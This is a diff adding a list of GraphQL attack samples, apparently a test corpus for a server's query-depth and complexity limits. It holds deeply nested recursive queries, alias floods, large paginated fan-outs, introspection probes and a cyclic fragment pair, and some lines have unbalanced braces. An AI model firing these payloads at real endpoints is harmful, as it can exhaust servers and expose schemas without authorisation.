@@ -1,0 +1,22 @@
+# GraphQL depth/complexity attack samples — deeply nested queries,
+# aliasing abuse, introspection attempts, and fragment cycles.
+{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{}}}}}}}}}}}}}}}}}}}
+{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{}}}}}}}}}}}}}}}}}
+query{user{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{id,name,friends{}}}}}}}}}}}}}}}}}}}
+{__schema{types{name fields{name}}}}
+{__type(name:"User"){fields{name}}}
+{__typename}
+{a1:a a2:a a3:a a4:a a5:a a6:a a7:a a8:a a9:a a10:a a11:a a12:a a13:a a14:a a15:a a16:a a17:a a18:a a19:a a20:a}
+{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+{viewer{repositories(first:100){nodes{pullRequests(first:100){nodes{commits(first:100){nodes{commit{history(first:100){nodes{tree{entries{name}}}}}}}}}}}}}}}
+mutation{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{}}}}}}}}}}}}}}}}}}}}}}}}}}}
+{users{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{}}}}}}}}}}}}}}}}}}}
+{q{r{s{t{u{v{w{x{y{z{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+fragment A on Q { x ...B } fragment B on Q { y ...A }
+{subreddits(first:100){nodes{posts(first:100){nodes{comments(first:100){nodes{author{posts(first:100){nodes{comments(first:100){nodes{author{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind description fields{name type{name kind ofType{name kind}}}}}}
+{a{x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y(x:y{})))))))))))))))))))))}}}
+{node(id:"root"){children{id children{id children{id children{id children{id children{id children{id children{id children{id children{id children{id children{}}}}}}}}}}}}}}
+query DeepBombs{bombs{explosions{fire{smoke{debris{shockwave{aftershock{rubble{dust{embers{flames{sparks{cinders{char{ash{soot{}}}}}}}}}}}}}}}}}
+{products(first:1000){edges{node{reviews(first:1000){edges{node{author{reviews(first:1000){edges{node{author{reviews{edges{node{author{reviews{edges{node{author{reviews{edges{node{}}}}}}}}}}}}}}}}}}}}}}}
+{"query":"query{user{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{id friends{}}}}}}}}}}}}}}}}"}
